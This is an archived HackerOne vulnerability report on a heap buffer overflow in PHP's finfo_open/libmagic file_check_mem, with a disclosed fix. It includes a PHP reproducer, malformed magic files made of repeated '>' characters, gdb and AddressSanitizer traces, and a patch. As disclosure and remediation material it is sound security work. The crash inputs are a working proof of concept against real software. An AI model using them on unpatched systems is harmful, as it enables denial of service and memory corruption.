# Buffer over-write in finfo_open with malformed magic file.

## Report Details
- **Report ID**: 476179
- **URL**: https://hackerone.com/reports/476179
- **State**: Closed
- **Severity**: high
- **Submitted**: 2019-01-07T20:34:26.499Z
- **Disclosed**: 2020-11-09T01:46:27.320Z

## Reporter
- **Username**: haquaman
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
https://bugs.php.net/bug.php?id=71527

This bug causes a segfault when running with environment variable USE_ZEND_ALLOC set to 0, and also when compiled with ASAN with USE_ZEND_ALLOC set and unset.

To reproduce, run the following PHP file, with the example magic file below.

$ cat magic-open.php
<?php
$finfo = finfo_open(FILEINFO_NONE, $argv[1]);
$info = finfo_file($finfo, $argv[2]);
var_dump($info);
?>

Magic file is (used without ASAN):
$ xxd -g 1 magic.crash-noasan
0000000: 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e  >>>>>>>>>>>>>>>>
0000010: 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e     >>>>>>>>>>>>>>>

$ cat magic.crash-noasan
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

Magic file is (used with ASAN):
$ xxd -g 1 magic.crash-asan
0000000: 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e  >>>>>>>>>>>>>>>>
0000010: 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e  >>>>>>>>>>>>>>>>
0000020: 71 3e 3e 3e 3e 3e 3e 3e 3e 0a 00                 q>>>>>>>>..

$ cat magic.crash-asan
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>q>>>>>>>>

Then run the program like:

./sapi/cli/php magic-open.php magic.crash /dev/null

You will get the following when NOT compiled with ASAN, and USE_ZEND_ALLOC is UNSET (no crash).

$ ./php-5.6.18-noasan magic-open.php magic.crash-noasan /dev/null

Warning: finfo_open(): Failed to load magic database at '/root/php-src/magic.crash-noasan'. in /root/php-src/magic-open.php on line 2

Warning: finfo_file() expects parameter 1 to be resource, boolean given in /root/php-src/magic-open.php on line 3
bool(false)


You will get the following when NOT compiled with ASAN, and USE_ZEND_ALLOC is set to 0 (crash).

 $ USE_ZEND_ALLOC=0 ./php-5.6.18-noasan magic-open.php magic.crash-noasan /dev/null
Segmentation fault

 $ USE_ZEND_ALLOC=0 gdb --args ./php-5.6.18-noasan magic-open.php magic.crash-noasan /dev/null                                                                      
<snip>
(gdb) r
Starting program: /root/php-src/php-5.6.18-noasan magic-open.php magic.crash-noasan /dev/null

Program received signal SIGSEGV, Segmentation fault.
_int_malloc (av=0x7ffff76ae760 <main_arena>, bytes=79) at malloc.c:3489
3489    malloc.c: No such file or directory.
(gdb) bt
#0  _int_malloc (av=0x7ffff76ae760 <main_arena>, bytes=79) at malloc.c:3489
#1  0x00007ffff73727b0 in __GI___libc_malloc (bytes=79) at malloc.c:2891
#2  0x0000000000a9fb44 in xbuf_format_converter (xbuf=xbuf@entry=0x7fffffff9d30, fmt=fmt@entry=0x1188930 "Failed to load magic database at '%s'.", 
    ap=ap@entry=0x7fffffff9e30) at /root/php-src/main/spprintf.c:245
#3  0x0000000000aa260d in vspprintf (pbuf=pbuf@entry=0x7fffffff9d90, max_len=max_len@entry=0, format=format@entry=0x1188930 "Failed to load magic database at '%s'.", 
    ap=ap@entry=0x7fffffff9e30) at /root/php-src/main/spprintf.c:821
#4  0x0000000000a88caf in php_verror (docref=0x0, params=params@entry=0x116a24a "", type=type@entry=2, 
    format=format@entry=0x1188930 "Failed to load magic database at '%s'.", args=args@entry=0x7fffffff9e30) at /root/php-src/main/main.c:786
#5  0x0000000000a8a644 in php_error_docref0 (docref=docref@entry=0x0, type=type@entry=2, format=format@entry=0x1188930 "Failed to load magic database at '%s'.")
    at /root/php-src/main/main.c:965
#6  0x00000000006e6338 in zif_finfo_open (ht=<optimized out>, return_value=0x18779b0, return_value_ptr=<optimized out>, this_ptr=0x0, return_value_used=<optimized out>)
    at /root/php-src/ext/fileinfo/fileinfo.c:348
#7  0x00000000010702a0 in zend_do_fcall_common_helper_SPEC (execute_data=<optimized out>) at /root/php-src/Zend/zend_vm_execute.h:558
#8  0x0000000000e40689 in execute_ex (execute_data=0x1844f10) at /root/php-src/Zend/zend_vm_execute.h:363
#9  0x0000000000d0409d in zend_execute_scripts (type=type@entry=8, retval=retval@entry=0x0, file_count=file_count@entry=3) at /root/php-src/Zend/zend.c:1341
#10 0x0000000000a92d42 in php_execute_script (primary_file=primary_file@entry=0x7fffffffd4a0) at /root/php-src/main/main.c:2610
#11 0x000000000107b1d1 in do_cli (argc=4, argv=0x17588a0) at /root/php-src/sapi/cli/php_cli.c:994
#12 0x00000000004212e9 in main (argc=4, argv=0x17588a0) at /root/php-src/sapi/cli/php_cli.c:1378
(gdb) x/i $rip
=> 0x7ffff736ff31 <_int_malloc+689>:    mov    %r14,0x10(%r9)
(gdb) i r
rax            0x7fffffff939f   140737488327583
rbx            0x7ffff76ae760   140737344366432
rcx            0x0      0
rdx            0x7ffff76ae788   140737344366472
rsi            0x7a0    1952
rdi            0x7ffff76ae760   140737344366432
rbp            0x60     0x60
rsp            0x7fffffff9310   0x7fffffff9310
r8             0x4      4
r9             0x0      0
r10            0x0      0
r11            0x416c20 4287520
r12            0x1878bb0        25660336
r13            0x6      6
r14            0x7ffff76ae7b8   140737344366520
r15            0x2710   10000
rip            0x7ffff736ff31   0x7ffff736ff31 <_int_malloc+689>
eflags         0x10287  [ CF PF SF IF RF ]
cs             0x33     51
ss             0x2b     43
ds             0x0      0
es             0x0      0
fs             0x0      0
gs             0x0      0


When compiled WITH ASAN, and USE_ZEND_ALLOC is unset (crash).
 $ ./php-5.6.18-asan magic-open.php magic.crash-asan /dev/null
ASAN:SIGSEGV
=================================================================
==20824== ERROR: AddressSanitizer: SEGV on unknown address 0x00000001f168 (pc 0x000000f9d7d4 sp 0x7ffc11db3770 bp 0x000000000000 T0)
AddressSanitizer can not provide additional info.
    #0 0xf9d7d3 in zend_mm_remove_from_free_list /root/php-src/Zend/zend_alloc.c:809
    #1 0xfa35f2 in _zend_mm_alloc_int /root/php-src/Zend/zend_alloc.c:2021
    #2 0xddffe7 in xbuf_format_converter /root/php-src/main/spprintf.c:794
    #3 0xde6b75 in vspprintf /root/php-src/main/spprintf.c:821
    #4 0xde6b75 in spprintf /root/php-src/main/spprintf.c:840
    #5 0xdc0d47 in php_verror /root/php-src/main/main.c:852
    #6 0xdc142a in php_error_docref0 /root/php-src/main/main.c:965
    #7 0x7fe8ca in zif_finfo_open /root/php-src/ext/fileinfo/fileinfo.c:348
    #8 0x17f7969 in zend_do_fcall_common_helper_SPEC /root/php-src/Zend/zend_vm_execute.h:558
    #9 0x139d03d in execute_ex /root/php-src/Zend/zend_vm_execute.h:363
    #10 0x11816fa in zend_execute_scripts /root/php-src/Zend/zend.c:1341
    #11 0xdcb6f1 in php_execute_script /root/php-src/main/main.c:2610
    #12 0x1806199 in do_cli /root/php-src/sapi/cli/php_cli.c:994
    #13 0x43622f in main /root/php-src/sapi/cli/php_cli.c:1378
    #14 0x7f87f6409ec4 (/lib/x86_64-linux-gnu/libc.so.6+0x21ec4)
    #15 0x4373ac in _start (/root/php-src/php-5.6.18-asan+0x4373ac)
SUMMARY: AddressSanitizer: SEGV /root/php-src/Zend/zend_alloc.c:809 zend_mm_remove_from_free_list
==20824== ABORTING
Aborted


And compiled with ASAN and USE_ZEND_ALLOC set to 0:

 $ USE_ZEND_ALLOC=0 ./php-5.6.18-asan magic-open.php magic.crash-asan /dev/null                                                                                     
=================================================================
==20849== ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60340000cd04 at pc 0x8664d0 bp 0x7ffcc02d84b0 sp 0x7ffcc02d84a8
WRITE of size 4 at 0x60340000cd04 thread T0
    #0 0x8664cf in file_check_mem /root/php-src/ext/fileinfo/libmagic/funcs.c:426
    #1 0x80cd7b in parse /root/php-src/ext/fileinfo/libmagic/apprentice.c:1520
    #2 0x80cd7b in load_1 /root/php-src/ext/fileinfo/libmagic/apprentice.c:1022
    #3 0x8184aa in apprentice_load /root/php-src/ext/fileinfo/libmagic/apprentice.c:1215
    #4 0x81c6dc in apprentice_1 /root/php-src/ext/fileinfo/libmagic/apprentice.c:417
    #5 0x823594 in file_apprentice /root/php-src/ext/fileinfo/libmagic/apprentice.c:603
    #6 0x7fe571 in zif_finfo_open /root/php-src/ext/fileinfo/fileinfo.c:347
    #7 0x17f7969 in zend_do_fcall_common_helper_SPEC /root/php-src/Zend/zend_vm_execute.h:558
    #8 0x139d03d in execute_ex /root/php-src/Zend/zend_vm_execute.h:363
    #9 0x11816fa in zend_execute_scripts /root/php-src/Zend/zend.c:1341
    #10 0xdcb6f1 in php_execute_script /root/php-src/main/main.c:2610
    #11 0x1806199 in do_cli /root/php-src/sapi/cli/php_cli.c:994
    #12 0x43622f in main /root/php-src/sapi/cli/php_cli.c:1378
    #13 0x7f773df01ec4 (/lib/x86_64-linux-gnu/libc.so.6+0x21ec4)
    #14 0x4373ac in _start (/root/php-src/php-5.6.18-asan+0x4373ac)
0x60340000cd04 is located 36 bytes to the right of 480-byte region [0x60340000cb00,0x60340000cce0)
allocated by thread T0 here:
    #0 0x7f773e9df55f (/usr/lib/x86_64-linux-gnu/libasan.so.0+0x1555f)
    #1 0x8662ab in file_check_mem /root/php-src/ext/fileinfo/libmagic/funcs.c:418
SUMMARY: AddressSanitizer: heap-buffer-overflow /root/php-src/ext/fileinfo/libmagic/funcs.c:429 file_check_mem
Shadow bytes around the buggy address:
  0x0c06ffff9950: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c06ffff9960: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c06ffff9970: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c06ffff9980: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c06ffff9990: 00 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa
=>0x0c06ffff99a0:[fa]fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c06ffff99b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c06ffff99c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c06ffff99d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c06ffff99e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c06ffff99f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:     fa
  Heap righ redzone:     fb
  Freed Heap region:     fd
  Stack left redzone:    f1
  Stack mid redzone:     f2
  Stack right redzone:   f3
  Stack partial redzone: f4
  Stack after return:    f5
  Stack use after scope: f8
  Global redzone:        f9
  Global init order:     f6
  Poisoned by user:      f7
  ASan internal:         fe
==20849== ABORTING
Aborted



Right, so those are all the possible crash states, the patch to fix is simple:

diff --git a/ext/fileinfo/libmagic/funcs.c b/ext/fileinfo/libmagic/funcs.c
index bd6d3d5..aefb95d 100644
--- a/ext/fileinfo/libmagic/funcs.c
+++ b/ext/fileinfo/libmagic/funcs.c
@@ -414,7 +414,7 @@ file_check_mem(struct magic_set *ms, unsigned int level)
        size_t len;
 
        if (level >= ms->c.len) {
-               len = (ms->c.len += 20) * sizeof(*ms->c.li);
+               while (level >= ms->c.len) len = (ms->c.len += 20) * sizeof(*ms->c.li);
                ms->c.li = CAST(struct level_info *, (ms->c.li == NULL) ?
                    emalloc(len) :
                    erealloc(ms->c.li, len));


Reasoning for that patch is with these tests, level is set to either 31 (noasan test file), or 32 (asan test file), and ms->c.len is 10. Originally it added 20 to the length, then realloc'd the memory chunk, then indexed into the memory at position "level". This overflowed the memory, and a write occurred. This patch ensures that the memory length is over the size of level.

You can see this from some gdb sessions:

$ gdb -ex 'break file_check_mem' -ex run -ex bt -ex 'p ms->c.len' -ex quit --args ./php-5.6.18-noasan magic-open.php magic.crash-noasan /dev/null 
<snip>
Breakpoint 1 at 0x7235a0: file /root/php-src/ext/fileinfo/libmagic/funcs.c, line 413.
Starting program: /root/php-src/php-5.6.18-noasan magic-open.php magic.crash-noasan /dev/null

Breakpoint 1, file_check_mem (ms=ms@entry=0x1879810, level=level@entry=31) at /root/php-src/ext/fileinfo/libmagic/funcs.c:413
413     {
#0  file_check_mem (ms=ms@entry=0x1879810, level=level@entry=31) at /root/php-src/ext/fileinfo/libmagic/funcs.c:413
#1  0x00000000006f1f3a in parse (action=<optimized out>, lineno=<optimized out>, line=0x7fffffff5bd0 '>' <repeats 31 times>, me=0x7fffffff5bc0, ms=<optimized out>)
    at /root/php-src/ext/fileinfo/libmagic/apprentice.c:1520
#2  load_1 (ms=ms@entry=0x1879810, action=action@entry=0, fn=fn@entry=0x18779e0 "/root/php-src/magic.crash-noasan", errs=errs@entry=0x7fffffff7c60, 
    mset=mset@entry=0x7fffffff7c70) at /root/php-src/ext/fileinfo/libmagic/apprentice.c:1022
#3  0x00000000006f9a03 in apprentice_load (ms=ms@entry=0x1879810, fn=fn@entry=0x18779e0 "/root/php-src/magic.crash-noasan", action=action@entry=0)
    at /root/php-src/ext/fileinfo/libmagic/apprentice.c:1215
#4  0x00000000006fdfa6 in apprentice_1 (ms=0x1879810, fn=0x18779e0 "/root/php-src/magic.crash-noasan", action=0) at /root/php-src/ext/fileinfo/libmagic/apprentice.c:417
#5  0x00000000006fffae in file_apprentice (ms=0x1879810, fn=0x18779e0 "/root/php-src/magic.crash-noasan", action=0)
    at /root/php-src/ext/fileinfo/libmagic/apprentice.c:603
#6  0x0000000000725bb7 in magic_load (ms=<optimized out>, magicfile=<optimized out>) at /root/php-src/ext/fileinfo/libmagic/magic.c:267
#7  0x00000000006e61e5 in zif_finfo_open (ht=<optimized out>, return_value=0x18779b0, return_value_ptr=<optimized out>, this_ptr=0x0, return_value_used=<optimized out>)
    at /root/php-src/ext/fileinfo/fileinfo.c:347
#8  0x00000000010702a0 in zend_do_fcall_common_helper_SPEC (execute_data=<optimized out>) at /root/php-src/Zend/zend_vm_execute.h:558
#9  0x0000000000e40689 in execute_ex (execute_data=0x1844f10) at /root/php-src/Zend/zend_vm_execute.h:363
#10 0x0000000000d0409d in zend_execute_scripts (type=type@entry=8, retval=retval@entry=0x0, file_count=file_count@entry=3) at /root/php-src/Zend/zend.c:1341
#11 0x0000000000a92d42 in php_execute_script (primary_file=primary_file@entry=0x7fffffffd4a0) at /root/php-src/main/main.c:2610
#12 0x000000000107b1d1 in do_cli (argc=4, argv=0x17588a0) at /root/php-src/sapi/cli/php_cli.c:994
#13 0x00000000004212e9 in main (argc=4, argv=0x17588a0) at /root/php-src/sapi/cli/php_cli.c:1378
$1 = 10


So looking at the possible attacks, without asan, and not using zend alloc, we have a segfault in alloc, where alloc is presumably trying to determine free space from unassigned memory that we wrote to when overflowing, this causes a crash. This is backed up when we look at the stack trace of when we run with asan, and using zend_alloc, where we get a segfault in zend_mm_remove_from_free_list, which is caused by a call to ZEND_MM_CHECK_TREE with a mm_block with an invalid parent pointer.

Running with asan, and not using zend alloc, pinpoints the location of the buffer overwrite, to be in file_check_mem, where we patched.

After the patch, there are no crashes, and you get the message the same as running without asan and with zend alloc.

Thanks for taking the time to read this report, sorry it was such a long one, just wanted to get across all the different scenarios.

--

Upstream bug for libmagic was reported at http://bugs.gw.com/view.php?id=522

This was fixed with a slightly different patch from upstream libmagic and applied to PHP

## Impact

Can write arbitrary memory after the buffer, which leads to memory corruption and possibly remote code execution

## Attachments
No attachments
